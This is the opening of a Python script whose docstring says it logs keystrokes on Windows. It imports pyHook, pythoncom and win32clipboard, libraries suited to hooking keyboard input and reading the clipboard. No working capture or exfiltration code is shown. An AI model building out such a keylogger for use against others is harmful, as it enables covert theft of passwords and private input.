#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Logs keystrokes on Windows only (so far), will be improving it if there's time.
"""

from ctypes import *
import pythoncom
import pyHook
import win32clipboard